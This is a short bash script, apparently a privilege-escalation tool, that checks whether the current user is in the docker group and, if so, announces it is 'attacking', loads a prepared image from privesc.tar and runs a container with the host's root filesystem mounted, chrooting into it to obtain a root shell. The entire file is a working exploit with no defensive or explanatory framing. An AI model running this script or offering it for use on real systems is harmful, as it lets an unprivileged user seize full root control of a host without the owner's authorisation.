#!/usr/bin/env bash

if [ $(id -u) -eq 0 ]; then
    echo "Already root"
    exit
fi

if groups $USER | grep -q docker; then
    echo "User $USER in docker group, attacking..."
    docker load --input privesc.tar
    docker run -v /:/mnt --rm -it docker-privesc chroot /mnt sh
    # Manual cleanup: docker rm -f docker-privesc
else
    echo "User $USER not in docker group, abort."
fi
